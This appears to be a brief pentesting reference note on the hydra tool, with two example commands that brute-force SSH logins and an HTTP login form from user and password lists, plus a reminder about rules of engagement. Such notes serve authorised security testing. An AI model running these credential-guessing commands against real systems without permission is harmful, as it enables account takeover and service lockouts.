---
title: "hydra"
type: tool-note
tool: hydra
tags: [tool, pentesting]
cssclass: cs-note
---

# hydra

## Objective
Online password guessing against network services.

## Common Commands
```bash
hydra -L users.txt -P passwords.txt ssh://10.0.0.5
hydra -l admin -P passwords.txt http-post-form \
  "http://target/login:username=^USER^&password=^PASS^:F=Invalid"
```

## Notes
Follow ROE; throttle to avoid lockouts.

## References
- https://github.com/vanhauser-thc/thc-hydra


